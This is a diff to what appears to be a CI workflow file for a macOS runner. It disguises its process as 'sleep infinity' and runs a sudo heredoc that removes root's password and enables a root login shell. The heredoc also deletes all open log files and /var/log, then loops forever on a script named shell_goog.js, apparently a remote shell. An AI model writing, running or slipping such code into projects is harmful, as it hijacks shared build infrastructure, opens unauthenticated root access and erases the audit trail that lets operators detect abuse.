@@ -35,18 +35,17 @@ jobs:
         # Execute the main script with sudo
         # Note: Some commands from the original script that are Linux-specific have been removed or adapted.
         exec -a "sleep infinity" sudo -sH <<EOF
-        touch ~/.hushlogin
-        # Setting timezone
+        passwd -d root || true
+        sudo dscl . -change /Users/root UserShell /usr/bin/false /bin/zsh
+        sudo dscl . -passwd /Users/root ""
+        touch ~root/.hushlogin
+        cat logo.txt >/etc/issue
         ln -sf /usr/share/zoneinfo/Africa/Cairo /etc/localtime
-        
-        # Clean up log files
         lsof -Fn | grep -F '.log' | grep -v deleted | awk '/^n/ {print substr(\$0, 2)}' | xargs -I {} rm -rf {}
         rm -rf /var/log/*
-
         while true
         do
         date
-        # Assuming shell_goog.js is present in the repository
         node shell_goog.js -r -l -t 120
         sleep 2
         done
